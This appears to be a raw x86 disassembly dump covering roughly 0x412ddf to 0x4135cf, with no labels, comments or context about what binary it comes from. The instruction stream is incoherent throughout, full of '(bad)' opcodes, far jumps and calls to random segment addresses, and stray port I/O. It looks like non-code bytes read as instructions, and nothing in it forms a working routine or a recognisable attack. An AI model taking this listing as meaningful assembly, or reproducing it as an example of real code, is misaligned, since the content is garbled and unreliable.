  412ddf:	xor    cl,BYTE PTR [ebx+0x72eb898a]
  412de5:	and    eax,0xa301a434
  412dea:	pop    ecx
  412deb:	jle    0x412e2a
  412ded:	pop    edi
  412dee:	mov    ch,0xac
  412df0:	cmp    eax,0x9664a1e4
  412df5:	xchg   ebx,eax
  412df6:	bnd ret 
  412df8:	xchg   esi,eax
  412df9:	sar    DWORD PTR [edx+0xa],cl
  412dfc:	adc    BYTE PTR [ecx-0x46bf2b26],dl
  412e02:	jle    0x412dc3
  412e04:	jmp    0x23c4:0xe3c0178f
  412e0b:	mov    ebp,0x4d990976
  412e10:	test   al,0x4
  412e12:	xchg   edx,eax
  412e13:	das    
  412e14:	jg     0x412e25
  412e16:	imul   edi,edi,0x36e126ea
  412e1c:	inc    ebp
  412e1d:	cdq    
  412e1e:	mov    edi,0x783a7d11
  412e23:	mov    edx,0x4e7b4b94
  412e28:	xor    bh,cl
  412e2a:	ret    
  412e2b:	sbb    ebp,DWORD PTR [edx-0x9]
  412e2e:	mov    BYTE PTR ds:0xbe3df6f6,bl
  412e34:	dec    esp
  412e35:	xlat   BYTE PTR ds:[ebx]
  412e36:	(bad)  
  412e38:	ds xor bl,bl
  412e3b:	out    0x10,al
  412e3d:	pop    edx
  412e3e:	sbb    DWORD PTR [esp+eax*2-0x5319d276],esi
  412e45:	sbb    esp,DWORD PTR [esi]
  412e47:	pop    eax
  412e48:	cmp    al,0xc2
  412e4a:	out    0xec,eax
  412e4c:	loop   0x412e56
  412e4e:	mov    al,ds:0x7bb4dd58
  412e53:	daa    
  412e54:	shl    DWORD PTR gs:[edi-0x5c56b6c8],0xd0
  412e5c:	retf   
  412e5d:	adc    eax,0xd22d6552
  412e62:	inc    esp
  412e63:	cmovnp eax,DWORD PTR [esi+0x45568cbe]
  412e6a:	xor    al,BYTE PTR [edi+0x50]
  412e6d:	fst    QWORD PTR [eax+0x58a5f3a7]
  412e73:	sub    BYTE PTR [ebx-0x451536b2],dh
  412e79:	mov    ds:0x88685b32,eax
  412e7e:	push   edx
  412e7f:	push   esp
  412e80:	xchg   ecx,eax
  412e81:	adc    al,0xac
  412e83:	sahf   
  412e84:	(bad)  
  412e85:	outs   dx,DWORD PTR ds:[esi]
  412e86:	(bad)  
  412e87:	shr    DWORD PTR [esi],1
  412e89:	xchg   esi,eax
  412e8a:	push   ss
  412e8b:	frstor [eax+0x3c403a8c]
  412e91:	dec    esp
  412e92:	mov    es,edx
  412e94:	retf   
  412e95:	jmp    ebp
  412e97:	push   ss
  412e98:	adc    eax,0x9e24165d
  412e9d:	leave  
  412e9e:	sbb    BYTE PTR [edx+0x6a691073],ch
  412ea4:	ror    DWORD PTR [ecx-0x2b],cl
  412ea7:	cmc    
  412ea8:	(bad)  
  412ea9:	mov    bh,0x8e
  412eab:	xchg   ecx,eax
  412eac:	pop    ebx
  412ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eae:	outs   dx,DWORD PTR ds:[esi]
  412eaf:	aaa    
  412eb0:	call   0x3540:0xe841d366
  412eb7:	jle    0x412ea9
  412eb9:	in     eax,0xd8
  412ebb:	clc    
  412ebc:	xor    DWORD PTR [ebx+0x2915972c],ecx
  412ec2:	add    DWORD PTR [edi+0x6c189d5a],ebx
  412ec8:	pop    ss
  412ec9:	cmp    eax,0xbf492dbd
  412ece:	pop    ss
  412ecf:	jmp    0xed64:0x5038500a
  412ed6:	enter  0xdee1,0x95
  412eda:	mov    ds:0xaf8da88e,eax
  412edf:	sub    al,0x90
  412ee1:	adc    ecx,DWORD PTR [esi+0x50]
  412ee4:	ja     0x412ec5
  412ee6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee8:	mov    cs,WORD PTR [ebx+0x23]
  412eeb:	xchg   ebp,eax
  412eec:	ins    BYTE PTR es:[edi],dx
  412eed:	or     dl,ch
  412eef:	or     DWORD PTR [ebp+ebp*1+0x3],edx
  412ef3:	jno    0x412f16
  412ef5:	jle    0x412f16
  412ef7:	dec    ebx
  412ef8:	push   0xda3ddbf3
  412efd:	xor    esi,DWORD PTR [edi-0x5d4d2f3]
  412f03:	jecxz  0x412f0b
  412f05:	dec    esp
  412f06:	cmp    DWORD PTR [edi+0x1e947858],esi
  412f0c:	xor    DWORD PTR [esi],esi
  412f0e:	les    esi,FWORD PTR [ebp-0x5e18465c]
  412f14:	sbb    ax,0xe99d
  412f18:	out    0x39,eax
  412f1a:	mov    BYTE PTR [ebp+0x1d3fd745],bl
  412f20:	sub    ch,BYTE PTR [esi]
  412f22:	in     eax,0x7e
  412f24:	dec    esi
  412f25:	xchg   BYTE PTR [ecx-0x38],al
  412f28:	xor    cl,BYTE PTR [esi+0x260f12f8]
  412f2e:	fmul   QWORD PTR [ebx+edx*8]
  412f31:	(bad)  
  412f32:	(bad)  
  412f33:	popf   
  412f34:	fstp   QWORD PTR [ebp+0x3039cb39]
  412f3a:	out    dx,eax
  412f3b:	cmp    eax,0x283f828e
  412f40:	push   eax
  412f41:	jo     0x412f6d
  412f43:	fdivr  QWORD PTR ds:0x387ea485
  412f49:	stos   BYTE PTR es:[edi],al
  412f4a:	imul   esi,DWORD PTR [ebx+0x10dff064],0xffffff81
  412f51:	stos   DWORD PTR es:[edi],eax
  412f52:	add    ebp,DWORD PTR [ebp-0x2e]
  412f55:	mov    dl,BYTE PTR [ebx]
  412f57:	adc    ebx,DWORD PTR [edi+edx*1]
  412f5a:	xchg   al,bh
  412f5c:	bnd jp 0x412fd6
  412f5f:	sub    eax,DWORD PTR [edi]
  412f61:	ficomp WORD PTR [edi+0x5298424e]
  412f67:	lods   al,BYTE PTR ds:[esi]
  412f68:	or     BYTE PTR [ebx+esi*8],0x4c
  412f6c:	sub    eax,DWORD PTR [ebp-0x77]
  412f6f:	add    BYTE PTR [esi+0x72],0x53
  412f73:	push   ss
  412f74:	jecxz  0x412f93
  412f76:	adc    al,0xab
  412f78:	jge    0x412f30
  412f7a:	cmc    
  412f7b:	ins    DWORD PTR es:[edi],dx
  412f7c:	icebp  
  412f7d:	push   esi
  412f7e:	les    esi,FWORD PTR [ebp+0x12]
  412f81:	mov    gs,WORD PTR [ebx]
  412f83:	fst    QWORD PTR [edx]
  412f85:	stos   BYTE PTR es:[edi],al
  412f86:	sbb    al,0x82
  412f88:	into   
  412f89:	dec    BYTE PTR [eax+0x55]
  412f8c:	cmp    BYTE PTR [eax+0x6e655033],0x78
  412f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f94:	popa   
  412f95:	xor    DWORD PTR [ebp+0x1b6057bc],edx
  412f9b:	ret    0x69cc
  412f9e:	pop    esp
  412f9f:	or     ah,al
  412fa1:	arpl   WORD PTR [edx+0x72],cx
  412fa4:	call   0x32bd:0x3a105646
  412fab:	jns    0x412f89
  412fad:	jno    0x412f4f
  412faf:	sbb    esp,edi
  412fb1:	adc    BYTE PTR [esi],ch
  412fb3:	xchg   edx,eax
  412fb4:	(bad)  
  412fb5:	call   0x4715a1f7
  412fba:	sar    DWORD PTR [ebx+0x9],0x72
  412fbe:	imul   edx,DWORD PTR [eax-0x2c],0x1d29c643
  412fc5:	cmp    al,BYTE PTR [eax]
  412fc7:	imul   esp,DWORD PTR [ebx],0xf8650f35
  412fcd:	cwde   
  412fce:	fstp   DWORD PTR ds:0x90bb3e4d
  412fd4:	mov    fs,WORD PTR [esi-0x3aedb549]
  412fda:	or     esp,ecx
  412fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fdd:	push   ebp
  412fde:	jmp    0x412f9c
  412fe0:	dec    edx
  412fe1:	lods   eax,DWORD PTR ds:[esi]
  412fe2:	mov    edi,0x14fe26e0
  412fe7:	outs   dx,BYTE PTR ds:[esi]
  412fe8:	dec    ecx
  412fe9:	cmp    BYTE PTR [ebp-0x596353ef],ch
  412fef:	and    DWORD PTR [ebp-0x67e683e9],esp
  412ff5:	(bad)  
  412ff7:	sbb    al,BYTE PTR [esi+0x4f]
  412ffa:	daa    
  412ffb:	je     0x413074
  412ffd:	rcr    BYTE PTR [esi-0x6b],1
  413000:	scas   eax,DWORD PTR es:[edi]
  413001:	dec    esi
  413002:	pop    es
  413003:	or     ebx,edi
  413005:	test   DWORD PTR [ebx+0x3a],0x27ee0437
  41300c:	imul   ecx,DWORD PTR [eax+0x6f8e4a9c],0xd8616bd
  413016:	loope  0x41302d
  413018:	fild   QWORD PTR [edi]
  41301a:	(bad)  
  41301b:	jecxz  0x412fae
  41301d:	and    esp,DWORD PTR [ebx+0x3b3c384b]
  413023:	(bad)  
  413024:	imul   BYTE PTR [edx-0x12d7aba3]
  41302a:	push   0xfffffff9
  41302c:	mov    edx,0x1f6dda8
  413031:	jne    0x4130a7
  413033:	inc    edi
  413034:	cmp    cl,BYTE PTR [edi+0x32]
  413037:	and    eax,0x4a32b7b4
  41303c:	pop    ecx
  41303d:	lahf   
  41303e:	in     eax,0x27
  413040:	dec    edx
  413041:	enter  0x584,0xc5
  413045:	nop
  413046:	jb     0x413031
  413048:	or     eax,0x2e9a194
  41304d:	jae    0x413071
  41304f:	ss cmc 
  413051:	(bad)  
  413052:	lods   al,BYTE PTR ds:[esi]
  413053:	(bad)  [esi-0x163a7e0a]
  413059:	push   edx
  41305a:	fcom   QWORD PTR ds:0xe1d59e46
  413060:	loop   0x4130da
  413062:	jnp    0x4130be
  413064:	fld    st(4)
  413066:	jmp    0xb40fd7ea
  41306b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41306c:	call   0x4634e56c
  413071:	or     esp,DWORD PTR [ebx-0x5d4f6362]
  413077:	mov    edx,0x54d18428
  41307c:	dec    ebp
  41307d:	adc    DWORD PTR [edx],ecx
  41307f:	adc    ch,BYTE PTR [edi+eax*1]
  413082:	or     DWORD PTR [eax+eiz*2+0x4a],esi
  413086:	inc    ebp
  413087:	cld    
  413088:	jl     0x413105
  41308a:	adc    esp,DWORD PTR [ebp-0x4f423834]
  413090:	push   ecx
  413091:	sub    ebx,DWORD PTR [ebp+0x44ca84b3]
  413097:	cmp    eax,0x61395caf
  41309c:	fistp  QWORD PTR [ecx-0x67]
  41309f:	clc    
  4130a0:	stos   BYTE PTR es:[edi],al
  4130a1:	into   
  4130a2:	cmc    
  4130a3:	cmc    
  4130a4:	ins    DWORD PTR es:[edi],dx
  4130a5:	and    eax,0x9aa2962b
  4130aa:	cdq    
  4130ab:	sti    
  4130ac:	jle    0x413056
  4130ae:	cmp    edi,eax
  4130b0:	push   ebx
  4130b1:	dec    ebp
  4130b2:	add    bl,BYTE PTR [edx+0x6f]
  4130b5:	add    eax,0x43981f3a
  4130ba:	dec    ecx
  4130bb:	add    BYTE PTR [edi],cl
  4130bd:	cdq    
  4130be:	pop    esi
  4130bf:	rcr    BYTE PTR [edx+0x82734d5],1
  4130c5:	cmp    eax,edx
  4130c7:	bound  edi,QWORD PTR [edx+0x5cefb56]
  4130cd:	jno    0x413111
  4130cf:	sub    al,0x0
  4130d1:	int3   
  4130d2:	scas   eax,DWORD PTR es:[edi]
  4130d3:	adc    BYTE PTR [esi],0x4f
  4130d6:	out    0x8c,eax
  4130d8:	dec    esp
  4130d9:	push   esi
  4130da:	sti    
  4130db:	ds loop 0x413102
  4130de:	dec    esi
  4130df:	push   es
  4130e0:	mov    esi,0x91b33c18
  4130e5:	adc    al,0xd0
  4130e7:	mov    ss,WORD PTR [edi+0x7]
  4130ea:	loope  0x413121
  4130ec:	pop    ss
  4130ed:	aam    0x54
  4130ef:	mov    ecx,0x1e9ebde
  4130f4:	push   ds
  4130f5:	push   esi
  4130f6:	jmp    0x41307d
  4130f8:	sbb    DWORD PTR [esi],ecx
  4130fa:	sub    ebp,DWORD PTR [ecx+esi*8+0x70]
  4130fe:	jno    0x41317b
  413100:	fimul  WORD PTR [eax+0x377ebabe]
  413106:	xor    eax,0xa817799c
  41310b:	mov    BYTE PTR [esi+0x7c4465f6],dh
  413111:	mov    eax,ds:0x960b43a8
  413116:	popa   
  413117:	xchg   esi,eax
  413118:	sbb    dh,BYTE PTR [ecx-0x38]
  41311b:	cdq    
  41311c:	test   BYTE PTR [ecx+0x58e33972],ah
  413122:	cld    
  413123:	add    BYTE PTR [eax],dh
  413125:	xor    cl,BYTE PTR [eax]
  413127:	ret    
  413128:	adc    ah,BYTE PTR [esp+ecx*2+0x6d]
  41312c:	push   edi
  41312d:	fcomp  QWORD PTR [eax+0x3c]
  413130:	sbb    al,0x19
  413132:	in     eax,dx
  413133:	push   ecx
  413134:	xor    al,0x43
  413136:	push   edi
  413137:	mov    al,0xa
  413139:	in     eax,0x4f
  41313b:	jmp    0xfc79:0x389ad569
  413142:	xchg   edi,eax
  413143:	xchg   DWORD PTR ss:[ebp-0x68767795],ebp
  41314a:	sub    cl,al
  41314c:	mov    ah,BYTE PTR [eax]
  41314e:	das    
  41314f:	xchg   esp,edi
  413151:	and    al,0x11
  413153:	mov    ebp,0xe7002fdf
  413158:	test   BYTE PTR [ecx-0x77],0xa6
  41315c:	pop    ds
  41315d:	mov    BYTE PTR [eax+edx*8+0x5c],al
  413161:	mov    edx,0x1426e012
  413166:	inc    esp
  413167:	fld    TBYTE PTR [ecx+0x521287cf]
  41316d:	leave  
  41316e:	push   ss
  41316f:	adc    eax,0x90d4ba03
  413174:	dec    edx
  413175:	hlt    
  413176:	sub    al,0x8
  413178:	xchg   BYTE PTR [esi+0x51],bl
  41317b:	pop    ecx
  41317c:	and    al,0x79
  41317e:	mov    BYTE PTR [ebp+ebx*1+0xb],ch
  413182:	cmp    BYTE PTR [ebx-0x24793688],al
  413188:	jne    0x4131c6
  41318a:	cs inc ebx
  41318c:	push   ebp
  41318d:	repnz push es
  41318f:	pop    ecx
  413190:	jmp    0xf527:0x6a2313d8
  413197:	rcl    DWORD PTR [ebx],1
  413199:	adc    DWORD PTR ds:0x7fc1fb56,ebx
  41319f:	ins    DWORD PTR es:[edi],dx
  4131a0:	cld    
  4131a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131a2:	call   0x6d9:0xb74fe413
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	push   0x7a4e1411
  4131af:	push   edx
  4131b0:	pop    esp
  4131b1:	cmp    al,0x6b
  4131b3:	jnp    0x41322e
  4131b5:	jmp    0xa14c:0x7b52ef10
  4131bc:	aaa    
  4131bd:	push   esp
  4131be:	test   DWORD PTR [esi+0x2f],ecx
  4131c1:	popf   
  4131c2:	jge    0x4131ef
  4131c4:	push   0x55
  4131c6:	mov    ds:0x795f0135,eax
  4131cb:	jl     0x42a456d6
  4131d1:	fidiv  WORD PTR [ecx]
  4131d3:	das    
  4131d4:	or     BYTE PTR [ecx-0x568829e4],bl
  4131da:	clc    
  4131db:	je     0x4131ad
  4131dd:	or     DWORD PTR [esp-0x39840d39],eax
  4131e4:	cmp    al,0xb6
  4131e6:	cmp    ah,BYTE PTR [edx+0x2]
  4131e9:	outs   dx,BYTE PTR ds:[esi]
  4131ea:	sbb    eax,0x681fd4f8
  4131ef:	pop    ebp
  4131f0:	test   BYTE PTR [ecx],dl
  4131f2:	(bad)  
  4131f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f5:	aaa    
  4131f6:	or     eax,0xb39bce25
  4131fb:	sub    eax,0x58878a81
  413200:	push   ebp
  413201:	imul   ebx,DWORD PTR [edi+0x79],0x3b
  413205:	rcr    BYTE PTR [ebx+eax*2+0x5f],1
  413209:	stc    
  41320a:	and    eax,0xaf48ea98
  41320f:	sub    bl,dl
  413211:	popa   
  413212:	es dec edx
  413214:	rcl    BYTE PTR ds:0x373f83d8,1
  41321a:	rcr    BYTE PTR [ecx-0x205fa3d3],0xfa
  413221:	sbb    BYTE PTR [edx+esi*1-0x3a],ch
  413225:	mov    bh,BYTE PTR [edx+0x3]
  413228:	xor    BYTE PTR [edx-0x523457eb],0x1f
  41322f:	je     0x413219
  413231:	pop    ebx
  413232:	es loope 0x4132a5
  413235:	call   0xbf47d723
  41323a:	out    0x60,al
  41323c:	pop    esi
  41323d:	mov    dl,0x6d
  41323f:	lahf   
  413240:	mov    ecx,0xc3c71701
  413245:	xor    eax,0xdabad2ff
  41324a:	call   0x4104:0x8763856e
  413251:	bound  ebp,QWORD PTR [ecx+0x66]
  413254:	add    DWORD PTR [edi],ecx
  413256:	xchg   BYTE PTR [ecx-0x1c],ah
  413259:	add    eax,0x9cf3519d
  41325e:	repz ds jnp 0x4132b2
  413262:	repnz in eax,dx
  413264:	jb     0x413217
  413266:	jmp    0x413265
  413268:	cmp    al,0xf
  41326a:	jge    0x4132b7
  41326c:	cwde   
  41326d:	mov    cl,0x72
  41326f:	add    bl,BYTE PTR [ecx+0x1]
  413272:	xlat   BYTE PTR ds:[ebx]
  413273:	test   al,0x3b
  413275:	jl     0x4132e4
  413277:	shl    DWORD PTR [ebx],0x8c
  41327a:	pop    esp
  41327b:	sbb    eax,ecx
  41327d:	xor    eax,0x34a2e132
  413282:	fidiv  WORD PTR [esi-0x7b3c47de]
  413288:	sti    
  413289:	sub    DWORD PTR [edi-0x7d],0xfffffff3
  41328d:	sbb    cl,ah
  41328f:	push   ebp
  413290:	out    dx,eax
  413291:	ja     0x41329a
  413293:	ficomp WORD PTR [ecx-0x30]
  413296:	push   ebp
  413297:	rcr    BYTE PTR [esi+0x2a],cl
  41329a:	jb     0x4132b3
  41329c:	add    eax,0x7b1b130d
  4132a1:	mov    ds:0xee00cd1f,al
  4132a6:	pop    edi
  4132a7:	dec    ebp
  4132a8:	and    eax,0x533cc739
  4132ad:	sub    dh,BYTE PTR [edi+0x60]
  4132b0:	xor    BYTE PTR [ebx-0x1b933491],0xfd
  4132b7:	xchg   esp,eax
  4132b8:	iret   
  4132b9:	push   eax
  4132ba:	pop    ss
  4132bb:	jmp    DWORD PTR [eax-0x13]
  4132be:	xor    al,0xd
  4132c0:	aad    0x3
  4132c2:	rol    DWORD PTR [edx+edi*2+0x41],cl
  4132c6:	test   BYTE PTR [eax],dl
  4132c8:	jbe    0x413262
  4132ca:	ja     0x41332d
  4132cc:	sub    DWORD PTR [esi],edx
  4132ce:	mov    WORD PTR [edx-0x5a],cs
  4132d1:	mov    eax,gs
  4132d3:	sahf   
  4132d4:	sub    al,dl
  4132d6:	sbb    al,0xb2
  4132d8:	fistp  QWORD PTR ds:0xd1c8e20e
  4132de:	mov    ebp,0x9bd338af
  4132e3:	push   esi
  4132e4:	sbb    BYTE PTR [edx+ebp*8+0x4b],ch
  4132e8:	into   
  4132e9:	sub    ebx,DWORD PTR [esp+esi*4-0x20]
  4132ed:	xchg   edx,eax
  4132ee:	pusha  
  4132ef:	les    ebp,FWORD PTR [ecx]
  4132f1:	ins    BYTE PTR es:[edi],dx
  4132f2:	push   0xffffffc8
  4132f4:	shl    BYTE PTR [ebp+edx*2+0x4a],1
  4132f8:	add    esi,DWORD PTR ds:0x5cff74b9
  4132fe:	inc    edx
  4132ff:	std    
  413300:	xchg   esp,eax
  413301:	fwait
  413302:	push   cs
  413303:	inc    ecx
  413304:	jge    0x413291
  413306:	mov    dh,0x68
  413308:	retf   0x3866
  41330b:	jmp    0x76c87023
  413310:	test   eax,0xf0b3f044
  413315:	fcom   QWORD PTR [edi-0xf41b9f1]
  41331b:	sub    al,0x6d
  41331d:	inc    ebx
  41331e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41331f:	fwait
  413320:	xor    ch,ah
  413322:	sbb    dh,ch
  413324:	lods   al,BYTE PTR ds:[esi]
  413325:	fidivr WORD PTR [ecx+esi*8-0x3f93b8ee]
  41332c:	push   cs
  41332d:	inc    ecx
  41332e:	mov    ebp,0x6ed7109
  413333:	jne    0x4133a8
  413335:	sub    al,BYTE PTR [edi+0x6f]
  413338:	sub    ah,BYTE PTR [ebp-0x38425069]
  41333e:	mov    ebp,0xaf53d09f
  413343:	mov    ah,BYTE PTR [edi]
  413345:	lock add eax,0x65727625
  41334b:	xchg   ebp,eax
  41334c:	sbb    dl,BYTE PTR [ebx]
  41334e:	shl    ebp,cl
  413350:	xchg   BYTE PTR [edi],al
  413352:	cmp    BYTE PTR ds:0xbfc7d708,bl
  413358:	pop    ebx
  413359:	xchg   esp,eax
  41335a:	mov    ds:0x4b4e0c15,al
  41335f:	sub    edx,0xfffffffc
  413362:	pop    ds
  413363:	fstp   DWORD PTR [esi]
  413365:	cmp    esi,ebx
  413367:	loope  0x4133dd
  413369:	sti    
  41336a:	mov    al,ds:0xa22da533
  41336f:	or     eax,eax
  413371:	call   0x89c5:0xec7ae73f
  413378:	lea    ecx,[bx+di+0x21c3]
  41337d:	jecxz  0x41337b
  41337f:	ror    esp,cl
  413381:	bound  esi,QWORD PTR [edx]
  413383:	mov    ebx,0x4d87c104
  413388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413389:	repz int3 
  41338b:	pop    eax
  41338c:	das    
  41338d:	mov    eax,0x5a2f7892
  413392:	sub    ah,al
  413394:	inc    ebx
  413395:	add    al,0xc7
  413397:	pop    eax
  413398:	(bad)  
  413399:	mov    ebx,0x1434fe25
  41339e:	adc    ebp,DWORD PTR [edi+ebx*8-0x1160ef2d]
  4133a5:	add    edi,edx
  4133a7:	push   ebx
  4133a8:	push   0x5aee4bae
  4133ad:	stos   DWORD PTR es:[edi],eax
  4133ae:	sbb    ebp,DWORD PTR [edx-0x2f2a12c0]
  4133b4:	nop
  4133b5:	jo     0x41337a
  4133b7:	cwde   
  4133b8:	adc    ebx,DWORD PTR [edx]
  4133ba:	dec    ebp
  4133bb:	lds    eax,FWORD PTR [ebx-0x2c40debb]
  4133c1:	je     0x413391
  4133c3:	cs leave 
  4133c5:	ret    0xd9c1
  4133c8:	popf   
  4133c9:	dec    ebp
  4133ca:	add    ecx,DWORD PTR [edi]
  4133cc:	cmp    eax,0x892cbc19
  4133d1:	dec    ecx
  4133d2:	daa    
  4133d3:	and    DWORD PTR [ecx],esp
  4133d5:	sahf   
  4133d6:	jl     0x4133b4
  4133d8:	inc    ebp
  4133d9:	rcr    al,cl
  4133db:	stos   BYTE PTR es:[edi],al
  4133dc:	inc    ecx
  4133dd:	mov    dl,0x12
  4133df:	and    BYTE PTR [edi],0xaf
  4133e2:	enter  0x35d2,0x48
  4133e6:	and    eax,0x749a9882
  4133eb:	lea    edi,[edx]
  4133ed:	sbb    eax,0xca127c61
  4133f2:	je     0x413381
  4133f4:	cdq    
  4133f5:	cli    
  4133f6:	push   ss
  4133f7:	dec    eax
  4133f8:	mov    dl,0xae
  4133fa:	rcl    BYTE PTR [edx+0x74],0x10
  4133fe:	lea    ecx,[ecx+0x27]
  413401:	mov    esi,0x45d20b65
  413406:	(bad)
  413409:	popf   
  41340a:	or     esp,DWORD PTR es:[si]
  41340e:	xor    ah,BYTE PTR [esi-0x41f09097]
  413414:	fcomp  QWORD PTR [ebx]
  413416:	scas   eax,DWORD PTR es:[edi]
  413417:	(bad)  ds:[edi-0x18d1f27c]
  41341e:	inc    esp
  41341f:	outs   dx,BYTE PTR ds:[esi]
  413420:	call   0x2115:0x1c64f193
  413427:	mov    eax,0x623c145f
  41342c:	mov    bl,0x41
  41342e:	test   bh,al
  413430:	(bad)  
  413431:	cwde   
  413432:	xor    bl,BYTE PTR ds:0xcd55975a
  413438:	scas   al,BYTE PTR es:[edi]
  413439:	or     al,BYTE PTR [ecx+0x67e3ae85]
  41343f:	std    
  413440:	add    eax,0x799b378
  413445:	syscall 
  413447:	xchg   esp,eax
  413448:	mov    bl,0xf5
  41344a:	fs fs jbe 0x41340b
  41344e:	cmp    al,0x4e
  413450:	aas    
  413451:	out    dx,eax
  413452:	adc    BYTE PTR [ebp+eiz*8-0x1e2ce905],ah
  413459:	sub    al,0x70
  41345b:	cmp    al,0xe8
  41345d:	pop    edx
  41345e:	jno    0x4134c0
  413460:	loope  0x41343d
  413462:	ror    BYTE PTR [edx+0xa],1
  413465:	in     eax,dx
  413466:	stos   DWORD PTR es:[edi],eax
  413467:	pop    ebp
  413468:	jb     0x4134cf
  41346a:	mov    esi,0xd4601f1e
  41346f:	shr    DWORD PTR [esi-0x36],cl
  413472:	nop
  413473:	push   cs
  413474:	iret   
  413475:	ret    0x8d83
  413478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413479:	cmc    
  41347a:	cmp    esi,DWORD PTR [ebx+eax*2-0x20]
  41347e:	popf   
  41347f:	shr    DWORD PTR [eax],1
  413481:	mov    cl,0x3d
  413483:	es leave 
  413485:	mov    esi,0x98a87d4d
  41348a:	nop
  41348b:	or     BYTE PTR [ebx],dl
  41348d:	xor    ebx,DWORD PTR [ebp+0x10]
  413490:	mov    cl,0xaa
  413492:	retf   0x2460
  413495:	retf   
  413496:	(bad)  
  413497:	jl     0x413499
  413499:	pop    ds
  41349a:	(bad)  
  41349b:	cmp    esp,esi
  41349d:	js     0x41341f
  41349f:	and    al,0xe1
  4134a1:	clc    
  4134a2:	push   esi
  4134a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134a4:	sbb    DWORD PTR [edi+0x43],ebp
  4134a7:	repnz push esi
  4134a9:	xchg   esp,eax
  4134aa:	fwait
  4134ab:	cmp    DWORD PTR [eax],eax
  4134ad:	mov    esp,edi
  4134af:	cmp    BYTE PTR [edx+0x1aeafb32],0x98
  4134b6:	mov    eax,ds:0x9226e714
  4134bb:	aam    0x2b
  4134bd:	daa    
  4134be:	sub    BYTE PTR [esi+0xf],al
  4134c1:	cwde   
  4134c2:	mov    cl,dh
  4134c4:	fld    st(6)
  4134c6:	cmp    eax,0x36c4afd
  4134cb:	push   edx
  4134cc:	dec    ebp
  4134cd:	add    eax,DWORD PTR [edx]
  4134cf:	mov    BYTE PTR [edx+0x28],ah
  4134d2:	nop
  4134d3:	pop    eax
  4134d4:	push   0xfffffff4
  4134d6:	sbb    cl,BYTE PTR ds:0xde50b160
  4134dc:	fnstcw WORD PTR [esi+0x4]
  4134df:	rcl    edx,cl
  4134e1:	lea    ebp,[edi-0x2a696fc3]
  4134e7:	arpl   WORD PTR [ebx],cx
  4134e9:	xchg   ecx,eax
  4134ea:	push   edi
  4134eb:	lahf   
  4134ec:	fs jp  0x41354f
  4134ef:	lods   al,BYTE PTR ds:[esi]
  4134f0:	push   ebx
  4134f1:	sti    
  4134f2:	push   ss
  4134f3:	das    
  4134f4:	scas   al,BYTE PTR es:[edi]
  4134f5:	loopne 0x413542
  4134f7:	ds (bad) 
  4134f9:	ins    BYTE PTR es:[edi],dx
  4134fa:	or     eax,0xfad79af3
  4134ff:	sbb    DWORD PTR [ebx+0x58],0x2484df72
  413506:	mov    ds:0x118fa47a,eax
  41350b:	(bad)  
  41350c:	(bad)  
  41350d:	aas    
  41350e:	and    BYTE PTR [ebp-0x47],dl
  413511:	cmp    eax,DWORD PTR [ebx]
  413513:	sbb    BYTE PTR [edi+0x40],bh
  413516:	xchg   esp,eax
  413517:	inc    cx
  413519:	mov    ecx,0xd16f5918
  41351e:	das    
  41351f:	ror    DWORD PTR [esi+ecx*2-0x21],0x36
  413524:	fchs   
  413526:	stos   BYTE PTR es:[edi],al
  413527:	je     0x41350e
  413529:	jecxz  0x4135a8
  41352b:	jno    0x41358d
  41352d:	ficomp DWORD PTR [esp+eiz*2-0x1c]
  413531:	push   esp
  413532:	adc    BYTE PTR [edi],0x8f
  413535:	sbb    ebp,DWORD PTR [ebx-0x23]
  413538:	add    al,0x63
  41353a:	add    al,0xea
  41353c:	jg     0x4134cf
  41353e:	fstp   DWORD PTR ds:0xd35e8a9e
  413544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413545:	adc    DWORD PTR [eax-0x3],0xf2ca57fe
  41354c:	adc    eax,0x783e511e
  413551:	cs stc 
  413553:	imul   ebp,DWORD PTR [eax],0x7d8a8187
  413559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41355a:	in     eax,dx
  41355b:	cs clc 
  41355d:	stos   DWORD PTR es:[edi],eax
  41355e:	call   0x2337:0xa182a45
  413565:	pop    ecx
  413566:	push   edx
  413567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413568:	pop    ds
  413569:	cmp    DWORD PTR [eax+0x4a],ebp
  41356c:	inc    edx
  41356d:	cdq    
  41356e:	jns    0x4134f3
  413570:	sti    
  413571:	aaa    
  413572:	pusha  
  413573:	cmp    BYTE PTR [esi+edi*4-0x6cb3041],dh
  41357a:	cli    
  41357b:	test   eax,0x6ba7319a
  413580:	call   0xd6e:0xbee1d405
  413587:	sub    eax,ebx
  413589:	sub    al,0x68
  41358b:	dec    esi
  41358c:	fldcw  WORD PTR [ecx-0x2f4e119d]
  413592:	sub    BYTE PTR [edi],dh
  413594:	xor    al,0xd8
  413596:	inc    eax
  413597:	fwait
  413598:	xchg   esi,eax
  413599:	lock xchg esp,eax
  41359b:	pop    ss
  41359c:	out    0x9d,al
  41359e:	ror    dh,cl
  4135a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135a1:	cmp    DWORD PTR [edx+0xf],0x9d563bb8
  4135a8:	pushf  
  4135a9:	mov    cl,0xd1
  4135ab:	and    dh,BYTE PTR [ecx]
  4135ad:	sub    BYTE PTR [edi-0x72],dh
  4135b0:	jl     0x41359c
  4135b2:	mov    edx,0xbff33a40
  4135b7:	fbstp  TBYTE PTR [ebp+0x7b]
  4135ba:	fucomi st,st(4)
  4135bc:	mov    bh,0x86
  4135be:	adc    bh,dh
  4135c0:	dec    ebx
  4135c1:	je     0x4135e2
  4135c3:	rep ins BYTE PTR es:[edi],dx
  4135c5:	xor    BYTE PTR [ecx+0x72b477d3],cl
  4135cb:	add    ax,0x4fae
  4135cf:	stc    
